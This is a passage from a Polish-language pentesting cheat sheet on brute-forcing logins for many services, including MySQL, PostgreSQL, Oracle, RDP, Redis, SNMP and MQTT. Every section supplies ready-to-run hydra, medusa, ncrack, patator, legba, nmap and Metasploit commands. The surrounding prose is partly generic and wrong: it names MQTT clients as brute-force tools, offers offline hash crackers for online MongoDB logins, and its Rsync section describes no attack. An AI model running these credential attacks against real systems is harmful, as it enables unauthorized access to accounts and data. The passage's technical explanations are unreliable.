- Używanie silnych haseł i wymuszanie ich regularnej zmiany.
- Blokowanie adresów IP, które podejrzanie często próbują logować się do serwera.
- Wprowadzenie opóźnień między nieudanymi próbami logowania.
- Monitorowanie logów serwera w celu wykrywania podejrzanej aktywności.

Ważne jest, aby pamiętać, że przeprowadzanie ataków brute force na serwery LDAP bez zgody właściciela jest nielegalne i narusza zasady etyczne.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT (Message Queuing Telemetry Transport) to protokół komunikacyjny, który jest często wykorzystywany w aplikacjach IoT (Internet of Things). Protokół ten jest oparty na modelu publikuj-subskrybuj, w którym urządzenia publikują wiadomości na tematy (topics), a inne urządzenia subskrybują te tematy, aby otrzymywać te wiadomości.

MQTT jest często atakowany za pomocą techniki brute force w celu przechwycenia uwierzytelnienia i uzyskania dostępu do systemu. Atak brute force polega na próbie odgadnięcia hasła, korzystając z różnych kombinacji znaków, aż do znalezienia poprawnego hasła.

Aby przeprowadzić atak brute force na MQTT, można użyć narzędzi takich jak Mosquito, MQTT.fx lub MQTTlens. Te narzędzia umożliwiają wysyłanie wielu prób logowania z różnymi kombinacjami haseł, aż do znalezienia poprawnego.

Aby zabezpieczyć się przed atakami brute force na MQTT, zaleca się stosowanie silnych haseł, które są trudne do odgadnięcia. Ponadto, można ograniczyć liczbę prób logowania, blokując adresy IP, które próbują się zalogować po przekroczeniu określonej liczby nieudanych prób.

Ważne jest również monitorowanie logów systemowych w celu wykrywania podejrzanej aktywności i podejmowania odpowiednich działań w przypadku wykrycia ataku brute force.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

MongoDB jest popularnym systemem zarządzania bazą danych NoSQL, który wykorzystuje dokumenty w formacie JSON. W celu przeprowadzenia ataku brute-force na bazę danych MongoDB, można wykorzystać różne metody i narzędzia.

#### Metoda 1: Skryptowanie

1. Skryptowanie jest jednym z najpopularniejszych sposobów przeprowadzania ataków brute-force na MongoDB.
2. Można napisać skrypt w języku programowania, takim jak Python, który będzie próbował różnych kombinacji haseł, aż znajdzie poprawne.
3. Skrypt może korzystać z bibliotek takich jak `pymongo`, aby nawiązać połączenie z bazą danych i przetestować hasła.
4. Ważne jest, aby skrypt był zoptymalizowany i niezawodny, aby uniknąć blokowania przez system zabezpieczeń.

#### Metoda 2: Narzędzia do ataków słownikowych

1. Istnieje wiele narzędzi dostępnych online, które można wykorzystać do przeprowadzenia ataków słownikowych na MongoDB.
2. Te narzędzia wykorzystują gotowe listy haseł, które są próbowane w celu znalezienia poprawnego hasła.
3. Przykłady popularnych narzędzi to `Hydra` i `Medusa`.
4. Te narzędzia oferują różne opcje konfiguracji, takie jak limit czasu, liczba wątków i inne, które można dostosować do potrzeb ataku.

#### Metoda 3: Narzędzia do ataków siłowych

1. Ataki siłowe polegają na próbowaniu wszystkich możliwych kombinacji znaków, aby znaleźć poprawne hasło.
2. Istnieje wiele narzędzi dostępnych online, które można wykorzystać do przeprowadzenia ataków siłowych na MongoDB.
3. Przykłady popularnych narzędzi to `John the Ripper` i `Hashcat`.
4. Te narzędzia są bardzo potężne i mogą przeprowadzać ataki na różne algorytmy haszujące.

#### Metoda 4: Wykorzystanie słabych haseł

1. Często administratorzy baz danych używają słabych haseł, które są łatwe do odgadnięcia.
2. Przykłady słabych haseł to `admin`, `password`, `123456`, itp.
3. Przeprowadzenie ataku brute-force na bazę danych MongoDB może być skuteczne, jeśli administrator używa takich słabych haseł.
4. Ważne jest, aby zawsze używać silnych haseł i regularnie je zmieniać, aby uniknąć ataków brute-force.

#### Metoda 5: Wykorzystanie słabo zabezpieczonych instancji

1. Czasami administratorzy niekoniecznie zabezpieczają swoje instancje MongoDB poprawnie.
2. Przykłady słabych zabezpieczeń to brak hasła dla konta administratora lub otwarte porty bez żadnych ograniczeń.
3. Atakujący mogą wykorzystać te słabe zabezpieczenia, aby uzyskać dostęp do bazy danych MongoDB.
4. Ważne jest, aby zawsze odpowiednio zabezpieczać swoje instancje MongoDB i regularnie aktualizować oprogramowanie, aby uniknąć takich ataków.

#### Podsumowanie

Atak brute-force na bazę danych MongoDB może być skuteczną metodą, jeśli administrator używa słabych haseł lub niezabezpieczonych instancji. Ważne jest, aby zawsze stosować silne hasła, regularnie je zmieniać i odpowiednio zabezpieczać swoje instancje MongoDB, aby uniknąć takich ataków.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL (Microsoft SQL Server) jest popularnym systemem zarządzania bazą danych stosowanym w środowiskach Windows. Atakujący mogą próbować złamać zabezpieczenia bazy danych MSSQL za pomocą ataku brute force. Atak brute force polega na próbie odgadnięcia hasła, testując różne kombinacje haseł, aż do znalezienia poprawnego. Istnieje wiele narzędzi dostępnych do przeprowadzenia ataku brute force na serwerze MSSQL, takich jak SQLMap, Hydra i Patator.

Aby zabezpieczyć bazę danych MSSQL przed atakami brute force, można podjąć kilka środków ostrożności. Po pierwsze, należy używać silnych haseł, które są trudne do odgadnięcia. Należy również ograniczyć liczbę prób logowania, aby uniemożliwić atakującym wielokrotne próby odgadnięcia hasła. Można to osiągnąć poprzez konfigurację blokady konta po określonej liczbie nieudanych prób logowania. Ponadto, warto rozważyć zastosowanie mechanizmu dwuskładnikowego, który wymaga dodatkowego uwierzytelnienia przy logowaniu.

W przypadku wykrycia próby ataku brute force na serwerze MSSQL, należy podjąć odpowiednie działania. Można zablokować adres IP atakującego, aby uniemożliwić mu dalsze próby. Należy również zbadać logi systemowe, aby zidentyfikować źródło ataku i podjąć działania w celu zabezpieczenia systemu przed przyszłymi atakami.

Ważne jest, aby regularnie aktualizować oprogramowanie serwera MSSQL, aby korzystać z najnowszych poprawek zabezpieczeń. Należy również monitorować logi systemowe w celu wykrycia podejrzanej aktywności i podejmować odpowiednie działania w przypadku wykrycia ataku.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL jest popularnym systemem zarządzania bazą danych, który jest szeroko stosowany w aplikacjach internetowych. Atakujący często próbują złamać hasła do kont użytkowników MySQL za pomocą ataku brute force. Metoda ta polega na wielokrotnym próbowaniu różnych kombinacji haseł, aż do znalezienia poprawnego.

#### Narzędzia do ataku brute force na MySQL

Istnieje wiele narzędzi dostępnych do przeprowadzania ataków brute force na serwery MySQL. Niektóre z popularnych narzędzi to:

- **Hydra**: Jest to potężne narzędzie do ataków brute force, które obsługuje wiele protokołów, w tym MySQL.
- **Medusa**: Jest to kolejne narzędzie do ataków brute force, które obsługuje wiele protokołów, w tym MySQL.
- **SQLMap**: Jest to narzędzie do automatycznego wykrywania i wykorzystywania podatności w bazach danych, w tym MySQL. Może być również używane do przeprowadzania ataków brute force na konta MySQL.

#### Zabezpieczenia przed atakami brute force na MySQL

Aby zabezpieczyć serwer MySQL przed atakami brute force, można podjąć następujące kroki:

- **Silne hasła**: Upewnij się, że użytkownicy mają silne hasła, które są trudne do odgadnięcia.
- **Blokowanie adresów IP**: Można skonfigurować serwer MySQL w taki sposób, aby blokował adresy IP, które próbują wielokrotnie logować się nieudanymi próbami.
- **Ograniczenie liczby prób logowania**: Można ograniczyć liczbę prób logowania dla danego użytkownika w określonym czasie.
- **Monitorowanie logów**: Regularnie monitoruj logi serwera MySQL w celu wykrycia podejrzanej aktywności.

Pamiętaj, że ataki brute force są nielegalne i mogą prowadzić do poważnych konsekwencji prawnych. Wykorzystuj te informacje tylko w celach edukacyjnych i zgodnie z prawem.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

OracleSQL to język zapytań używany w systemie zarządzania bazą danych Oracle. Jest to potężne narzędzie, które umożliwia manipulację danymi, tworzenie tabel, indeksów i widoków, a także wykonywanie zaawansowanych operacji na bazie danych.

#### Ataki brute-force na OracleSQL

Ataki brute-force są popularnymi technikami stosowanymi przez hakerów do złamania haseł w systemach OracleSQL. Polegają one na próbie wielokrotnego odgadnięcia hasła, aż do skutku. Istnieje kilka metod, które można zastosować do przeprowadzenia ataku brute-force na OracleSQL:

1. **Słownik ataków brute-force**: Haker używa listy popularnych haseł lub słownika, aby przetestować wszystkie możliwe kombinacje i odgadnąć hasło.

2. **Atak brute-force z wykorzystaniem reguł**: Haker stosuje reguły do generowania różnych kombinacji haseł, takich jak dodawanie cyfr lub znaków specjalnych, aby zwiększyć szanse na odgadnięcie hasła.

3. **Atak brute-force z wykorzystaniem mocy obliczeniowej**: Haker wykorzystuje duże ilości mocy obliczeniowej, takie jak chmura obliczeniowa, aby przyspieszyć proces odgadywania hasła.

#### Zabezpieczenia przed atakami brute-force

Aby zabezpieczyć system OracleSQL przed atakami brute-force, można podjąć następujące środki ostrożności:

1. **Złożone hasła**: Używanie silnych, unikalnych haseł z różnymi kombinacjami liter, cyfr i znaków specjalnych.

2. **Blokowanie konta**: Po kilku nieudanych próbach logowania, blokowanie konta na określony czas może uniemożliwić hakerom kontynuowanie ataku brute-force.

3. **Monitorowanie logów**: Regularne monitorowanie logów systemowych może pomóc w wykrywaniu podejrzanej aktywności i podejrzanych prób logowania.

4. **Uaktualnienia oprogramowania**: Regularne aktualizacje oprogramowania OracleSQL mogą zawierać poprawki zabezpieczeń, które mogą chronić przed znanymi lukami w zabezpieczeniach.

5. **Używanie narzędzi do wykrywania ataków brute-force**: Istnieją narzędzia, które mogą pomóc w wykrywaniu i blokowaniu ataków brute-force na system OracleSQL.

Pamiętaj, że ataki brute-force są nielegalne i naruszają prywatność innych osób. Należy stosować te techniki wyłącznie w celach pentestingu lub zgodnie z prawem i zgodnie z zasadami etycznego hackingu.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Aby korzystać z **oracle\_login** z **patator**, musisz **zainstalować**:
```bash
pip3 install cx_Oracle --upgrade
```
[Brute force hashowania hasła OracleSQL w trybie offline](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**wersje 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** i **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
POP (Post Office Protocol) jest protokołem używanym do odbierania wiadomości e-mail z serwera pocztowego. Atak brute force na POP polega na próbie odgadnięcia hasła użytkownika, próbując różne kombinacje haseł, aż do znalezienia poprawnego. Ten atak jest często stosowany w celu uzyskania nieautoryzowanego dostępu do konta e-mail. Aby zabezpieczyć się przed atakami brute force na POP, zaleca się stosowanie silnych haseł i ograniczenie liczby nieudanych prób logowania.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL jest zaawansowanym systemem zarządzania bazą danych, który oferuje wiele funkcji i narzędzi do efektywnego przechowywania i przetwarzania danych. Jedną z popularnych technik ataku na PostgreSQL jest brute force, która polega na próbie odgadnięcia hasła, korzystając z różnych kombinacji znaków.

#### Metody ataku brute force na PostgreSQL

1. **Słownikowy atak brute force**: W tej metodzie atakujący korzysta z listy słów lub haseł, aby przetestować różne kombinacje. Atakujący może używać popularnych haseł, słowników językowych lub spersonalizowanych list haseł.

2. **Atak brute force z wykorzystaniem reguł**: W tej metodzie atakujący tworzy zestaw reguł, które definiują kombinacje znaków do przetestowania. Reguły mogą obejmować zmiany wielkości liter, dodawanie lub usuwanie znaków specjalnych, zamianę liter na liczby itp.

3. **Atak brute force z wykorzystaniem maski**: W tej metodzie atakujący definiuje maskę, która określa wzór hasła. Atakujący przetestuje wszystkie możliwe kombinacje zgodne z maską, aby odgadnąć hasło.

#### Narzędzia do ataku brute force na PostgreSQL

1. **Hydra**: Hydra jest popularnym narzędziem do ataków brute force, które obsługuje wiele protokołów, w tym PostgreSQL. Pozwala na konfigurację różnych parametrów ataku, takich jak lista haseł, liczba wątków, opóźnienie między próbami itp.

2. **Medusa**: Medusa to kolejne narzędzie do ataków brute force, które obsługuje PostgreSQL. Podobnie jak Hydra, Medusa umożliwia konfigurację różnych parametrów ataku i obsługuje wiele protokołów.

#### Zabezpieczenia przed atakami brute force na PostgreSQL

Aby zabezpieczyć się przed atakami brute force na PostgreSQL, można podjąć następujące środki ostrożności:

1. **Silne hasła**: Używaj silnych, unikalnych haseł, które są trudne do odgadnięcia. Unikaj popularnych haseł i łatwych do zgadnięcia kombinacji.

2. **Blokowanie konta**: Po kilku nieudanych próbach logowania, zablokuj konto na określony czas lub wymagaj ręcznego odblokowania przez administratora.

3. **Monitorowanie logów**: Monitoruj logi logowania, aby wykryć podejrzane aktywności, takie jak wielokrotne nieudane próby logowania.

4. **Ograniczenia czasowe**: Wprowadź ograniczenia czasowe dla prób logowania, aby uniemożliwić atakującym przeprowadzanie szybkich ataków brute force.

5. **Uaktualnienia oprogramowania**: Regularnie aktualizuj oprogramowanie PostgreSQL, aby korzystać z najnowszych zabezpieczeń i poprawek.

Pamiętaj, że ataki brute force są nielegalne i mogą prowadzić do poważnych konsekwencji prawnych. Wykorzystuj te informacje wyłącznie w celach edukacyjnych i zgodnie z prawem.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Możesz pobrać pakiet `.deb` do instalacji z [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) jest protokołem opracowanym przez firmę Microsoft, który umożliwia zdalne zarządzanie komputerem. Atakujący może wykorzystać technikę brute force, aby próbować odgadnąć hasło do konta RDP i uzyskać nieautoryzowany dostęp do zdalnego komputera.

#### Metody ataku brute force na RDP

1. **Słownik ataków**: Atakujący używa listy popularnych haseł lub słownika, aby przetestować różne kombinacje i odgadnąć hasło RDP.
2. **Atak siłowy**: Atakujący próbuje wszystkich możliwych kombinacji znaków, aby odgadnąć hasło RDP. Ta metoda jest bardziej czasochłonna, ale może przynieść sukces, jeśli hasło jest słabe.
3. **Atak hybrydowy**: Atakujący łączy słownik ataków z atakiem siłowym, aby przyspieszyć proces odgadywania hasła.

#### Narzędzia do ataku brute force na RDP

1. **Hydra**: Narzędzie do ataków siłowych i słownikowych, które obsługuje wiele protokołów, w tym RDP.
2. **Crowbar**: Narzędzie do ataków siłowych i słownikowych, które jest zoptymalizowane dla ataków na RDP.
3. **Ncrack**: Narzędzie do ataków siłowych i słownikowych, które obsługuje wiele protokołów, w tym RDP.

#### Zabezpieczenia przed atakami brute force na RDP

Aby zabezpieczyć się przed atakami brute force na RDP, można podjąć następujące kroki:

1. **Zmiana domyślnego portu**: Zmiana portu RDP z domyślnego (3389) na inny może utrudnić atakującym skanowanie i próby ataku.
2. **Użycie silnych haseł**: Używanie długich i złożonych haseł znacznie utrudnia odgadywanie ich za pomocą ataków brute force.
3. **Blokowanie adresów IP**: Można skonfigurować zapory sieciowe, które automatycznie blokują adresy IP, które podejrzanie często próbują się logować.
4. **Użycie dwuskładnikowej autoryzacji**: Włączenie dwuskładnikowej autoryzacji dla kont RDP dodaje dodatkową warstwę zabezpieczeń, wymagającą dodatkowego kodu uwierzytelniającego.

#### Podsumowanie

Ataki brute force na RDP są popularnym sposobem na zdobycie nieautoryzowanego dostępu do zdalnych komputerów. Aby zabezpieczyć się przed tymi atakami, należy podjąć odpowiednie środki ostrożności, takie jak zmiana domyślnego portu, stosowanie silnych haseł i włączenie dwuskładnikowej autoryzacji.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis jest popularnym systemem przechowywania danych w pamięci podręcznej, który jest szeroko stosowany w aplikacjach internetowych. Jego prostota i wydajność sprawiają, że jest często wybierany przez programistów.

#### Ataki Brute Force na Redis

Ataki Brute Force na Redis polegają na próbie odgadnięcia hasła dostępu do bazy danych Redis poprzez wypróbowanie różnych kombinacji haseł. Istnieje kilka metod, które można zastosować do przeprowadzenia takiego ataku:

1. **Słownikowy atak Brute Force**: W tej metodzie atakujący korzysta z listy popularnych haseł lub słowników, aby wypróbować różne kombinacje haseł. Jeśli hasło znajduje się na liście, atakujący uzyskuje dostęp do bazy danych.

2. **Atak Brute Force z wykorzystaniem reguł**: W tej metodzie atakujący stosuje różne reguły do generowania kombinacji haseł. Na przykład, atakujący może dodać liczby lub symbole do podstawowego hasła, aby stworzyć nowe kombinacje.

3. **Atak Brute Force z wykorzystaniem narzędzi**: Istnieje wiele narzędzi dostępnych online, które automatyzują proces ataku Brute Force na Redis. Te narzędzia mogą wypróbować tysiące kombinacji haseł w krótkim czasie.

#### Zabezpieczenia przed atakami Brute Force na Redis

Aby zabezpieczyć bazę danych Redis przed atakami Brute Force, można podjąć następujące środki ostrożności:

1. **Silne hasła**: Używanie silnych i unikalnych haseł dla bazy danych Redis jest kluczowe. Hasło powinno składać się z kombinacji liter, cyfr i symboli oraz być wystarczająco długie.

2. **Ograniczenie liczby prób logowania**: Można skonfigurować Redis w taki sposób, aby po określonej liczbie nieudanych prób logowania blokował adres IP atakującego.

3. **Monitorowanie logów**: Regularne monitorowanie logów Redis może pomóc w wykrywaniu podejrzanej aktywności i prób ataków Brute Force.

4. **Aktualizacje oprogramowania**: Regularne aktualizacje oprogramowania Redis są ważne, ponieważ dostawcy często wprowadzają poprawki bezpieczeństwa, które mogą chronić przed atakami Brute Force.

5. **Firewall**: Skonfigurowanie firewalla w celu blokowania nieautoryzowanego dostępu do bazy danych Redis może również pomóc w zabezpieczeniu przed atakami Brute Force.

Pamiętaj, że ochrona bazy danych Redis przed atakami Brute Force jest kluczowa dla zapewnienia bezpieczeństwa danych.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec (Remote Execution) is a network service that allows users to execute commands on a remote system. It is commonly used for administrative purposes, such as managing remote servers or troubleshooting network issues.

Brute-forcing Rexec involves attempting to guess the username and password combination to gain unauthorized access to the remote system. This can be done by systematically trying different combinations until the correct one is found.

To perform a brute-force attack on Rexec, you can use tools like Hydra or Medusa. These tools automate the process of trying different username and password combinations, making it faster and more efficient.

Before attempting a brute-force attack, it is important to gather information about the target system, such as the username format, common passwords, and any password policies in place. This information can help narrow down the possible combinations and increase the chances of success.

It is also recommended to use a strong wordlist for the password guessing phase. A wordlist is a file that contains a list of potential passwords to try. There are many wordlists available online, including ones that are specifically designed for brute-forcing purposes.

When performing a brute-force attack, it is important to be mindful of the potential legal and ethical implications. Unauthorized access to a remote system is illegal and can result in severe consequences. Always ensure that you have proper authorization and permission before attempting any brute-force attacks.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin (Remote Login) to protokół sieciowy, który umożliwia zdalne logowanie się do systemu Unix lub Linux. Protokół ten jest często wykorzystywany do zdalnego zarządzania serwerami. Rlogin używa autoryzacji opartej na hasłach, co oznacza, że użytkownik musi podać prawidłowe hasło, aby uzyskać dostęp do zdalnego systemu.

Atak brute force na protokół Rlogin polega na próbie odgadnięcia hasła, próbując różne kombinacje haseł, aż do znalezienia prawidłowego. Atak ten może być przeprowadzany za pomocą narzędzi do łamania haseł, takich jak Hydra lub Medusa.

Aby zabezpieczyć się przed atakami brute force na Rlogin, zaleca się stosowanie silnych haseł, które są trudne do odgadnięcia. Ponadto, można również zastosować mechanizmy blokowania konta po określonej liczbie nieudanych prób logowania, aby utrudnić atakującym kontynuowanie prób.

Ważne jest również regularne monitorowanie logów systemowych w celu wykrywania podejrzanej aktywności, takiej jak wielokrotne nieudane próby logowania, co może wskazywać na próbę ataku brute force.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) is a network protocol that allows users to execute commands on a remote system. It is commonly used for remote administration tasks. However, due to its lack of security features, it is highly vulnerable to brute force attacks.

#### Brute Forcing Rsh

To perform a brute force attack on Rsh, you can use tools like Hydra or Medusa. These tools automate the process of trying different combinations of usernames and passwords until a successful login is achieved.

Here is an example command using Hydra to brute force Rsh:

```plaintext
hydra -l <username> -P <password_list> rsh://<target_ip>
```

Replace `<username>` with the target username, `<password_list>` with the path to a file containing a list of passwords, and `<target_ip>` with the IP address of the target system.

#### Mitigation

To protect against brute force attacks on Rsh, it is recommended to disable or restrict Rsh access. If Rsh is necessary, consider implementing additional security measures such as:

- Using strong, complex passwords for Rsh accounts
- Enforcing account lockouts after a certain number of failed login attempts
- Implementing IP whitelisting to restrict access to trusted IP addresses only
- Monitoring Rsh logs for suspicious activity

By taking these precautions, you can significantly reduce the risk of successful brute force attacks on Rsh.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync jest narzędziem do synchronizacji plików między różnymi hostami. Może być używany do kopiowania plików lokalnie lub zdalnie. Rsync jest często stosowany w celu tworzenia kopii zapasowych, replikacji danych i udostępniania plików między różnymi systemami. Narzędzie to jest wygodne i efektywne, ponieważ tylko zmienione części plików są przesyłane, co oszczędza czas i przepustowość sieci. Rsync obsługuje różne protokoły, takie jak SSH, RSH i rsyncd.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real Time Streaming Protocol) jest protokołem komunikacyjnym używanym do przesyłania strumieniowego multimediów w czasie rzeczywistym. Jest często stosowany do transmisji wideo i audio w systemach monitoringu, telekonferencjach i innych aplikacjach strumieniowych.

#### Ataki Brute Force na RTSP

Ataki Brute Force na RTSP polegają na próbie odgadnięcia hasła dostępu do serwera RTSP poprzez wypróbowanie różnych kombinacji haseł. Atakujący może używać słowników haseł lub generować losowe kombinacje w celu złamania zabezpieczeń.

#### Narzędzia do Ataków Brute Force na RTSP

- **Hydra**: Narzędzie do ataków Brute Force, które obsługuje wiele protokołów, w tym RTSP.
- **Medusa**: Narzędzie do ataków Brute Force, które obsługuje wiele protokołów, w tym RTSP.
- **Ncrack**: Narzędzie do ataków Brute Force, które obsługuje wiele protokołów, w tym RTSP.

#### Zabezpieczenia przed Atakami Brute Force na RTSP

Aby zabezpieczyć serwer RTSP przed atakami Brute Force, można podjąć następujące kroki:

- Używać silnych haseł, które są trudne do odgadnięcia.
- Wprowadzić mechanizm blokowania konta po określonej liczbie nieudanych prób logowania.
- Monitorować logi logowania w celu wykrycia podejrzanej aktywności.
- Zaktualizować oprogramowanie serwera RTSP, aby wyeliminować znane luki w zabezpieczeniach.

#### Przykład Ataku Brute Force na RTSP

```
$ hydra -L users.txt -P passwords.txt rtsp://target_ip
```

W powyższym przykładzie narzędzie Hydra próbuje odgadnąć hasło dostępu do serwera RTSP, używając listy użytkowników z pliku "users.txt" i listy haseł z pliku "passwords.txt".
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP (Secure File Transfer Protocol) jest protokołem do bezpiecznego transferu plików. Wykorzystuje szyfrowanie do zapewnienia poufności i integralności danych podczas przesyłania. SFTP jest często stosowany do zdalnego zarządzania plikami na serwerach.

#### Ataki Brute Force na SFTP

Atak Brute Force na SFTP polega na próbie odgadnięcia hasła użytkownika, próbując różne kombinacje haseł. Atakujący wykorzystuje automatyczne narzędzia do generowania i testowania haseł w celu znalezienia poprawnego hasła.

#### Metody obrony przed atakami Brute Force na SFTP

Oto kilka metod, które można zastosować, aby zabezpieczyć serwer SFTP przed atakami Brute Force:

1. Użyj silnego hasła: Upewnij się, że hasło użytkownika jest wystarczająco długie i skomplikowane, aby utrudnić odgadnięcie.

2. Wprowadź blokady po nieudanych próbach logowania: Skonfiguruj serwer SFTP w taki sposób, aby blokował adresy IP, które przekroczyły określoną liczbę nieudanych prób logowania.

3. Wprowadź opóźnienia po nieudanych próbach logowania: Dodaj opóźnienie przed kolejną próbą logowania po nieudanej próbie. To utrudni atakującemu przeprowadzenie skutecznego ataku Brute Force.

4. Monitoruj logi: Regularnie sprawdzaj logi serwera SFTP, aby wykryć podejrzane aktywności i próby ataków Brute Force.

5. Wprowadź dwuskładnikowe uwierzytelnianie: Wprowadzenie drugiego czynnika uwierzytelniania, takiego jak kod jednorazowy, znacznie zwiększa bezpieczeństwo logowania.

6. Zaktualizuj oprogramowanie: Upewnij się, że serwer SFTP jest zawsze aktualny, aby uniknąć wykorzystania znanych podatności.

7. Wykorzystaj narzędzia do wykrywania ataków Brute Force: Istnieją narzędzia, które mogą pomóc w wykrywaniu i blokowaniu ataków Brute Force na serwerze SFTP.

Pamiętaj, że ochrona przed atakami Brute Force wymaga kombinacji różnych metod i stałego monitorowania, aby zapewnić bezpieczeństwo serwera SFTP.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP (Simple Network Management Protocol) jest protokołem używanym do zarządzania i monitorowania urządzeń sieciowych. Pozwala na zdalne monitorowanie i kontrolę urządzeń takich jak routery, przełączniki, serwery itp. Protokół SNMP działa na zasadzie zapytania i odpowiedzi, gdzie zarządzający urządzenie wysyła zapytanie do urządzenia docelowego, a to zwraca odpowiedź zawierającą informacje o swoim stanie i konfiguracji.

Atak brute force na SNMP polega na próbie odgadnięcia hasła do urządzenia SNMP poprzez wypróbowanie różnych kombinacji haseł. Atakujący może wykorzystać listę popularnych haseł, słowników lub generować losowe kombinacje. Jeśli atakujący odgadnie poprawne hasło, będzie mógł uzyskać dostęp do urządzenia i wykonywać różne operacje, takie jak zmiana konfiguracji, monitorowanie ruchu sieciowego itp.

Aby zabezpieczyć urządzenia SNMP przed atakami brute force, zaleca się stosowanie silnych haseł, ograniczenie dostępu do usługi SNMP tylko do zaufanych adresów IP oraz monitorowanie logów w celu wykrycia podejrzanej aktywności.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) to protokół komunikacyjny używany w systemach operacyjnych Windows do udostępniania plików, drukarek i innych zasobów sieciowych. Atakujący często wykorzystują brute force w celu złamania hasła do konta SMB i uzyskania nieautoryzowanego dostępu do zasobów sieciowych.

#### Brute force atak na SMB

Brute force atak na SMB polega na próbie odgadnięcia hasła poprzez wypróbowanie wszystkich możliwych kombinacji. Atakujący może użyć różnych narzędzi do automatycznego generowania i testowania haseł w celu złamania zabezpieczeń konta SMB.

#### Narzędzia do brute force ataku na SMB

Istnieje wiele narzędzi dostępnych do przeprowadzenia brute force ataku na SMB. Niektóre z popularnych narzędzi to:

- Hydra: Narzędzie do ataków brute force, które obsługuje wiele protokołów, w tym SMB.
- Medusa: Narzędzie do ataków brute force, które obsługuje wiele protokołów, w tym SMB.
- Ncrack: Narzędzie do ataków brute force, które obsługuje wiele protokołów, w tym SMB.

#### Zabezpieczenia przed brute force atakiem na SMB

Aby zabezpieczyć się przed brute force atakiem na SMB, można podjąć następujące środki ostrożności:

- Używanie silnych haseł: Używanie długich i złożonych haseł utrudnia odgadnięcie ich brute force atakiem.
